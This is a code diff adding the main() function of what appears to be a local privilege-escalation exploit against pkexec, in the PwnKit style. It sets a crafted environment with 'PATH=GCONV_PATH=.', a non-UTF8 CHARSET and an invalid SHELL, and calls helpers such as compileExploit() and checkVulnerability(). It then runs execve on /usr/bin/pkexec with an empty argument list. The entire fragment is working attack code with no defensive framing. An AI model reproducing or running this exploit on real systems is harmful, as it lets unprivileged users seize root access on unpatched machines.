@@ -1,0 +1,22 @@
+int main(int argc, char *argv[]) {
+	FILE *fp;
+
+	char * a_argv[]={ NULL };
+    	char * a_envp[]={
+            "exploit", 
+	    "PATH=GCONV_PATH=.", 
+	    "CHARSET=NOT_UTF8", 
+	    "SHELL=not/in/etc/shells", 
+	    NULL
+    	};
+
+	gconvpath();
+	
+	iconv_open();
+
+	compileExploit();
+
+	checkVulnerability();
+
+	execve("/usr/bin/pkexec", a_argv, a_envp);
+}
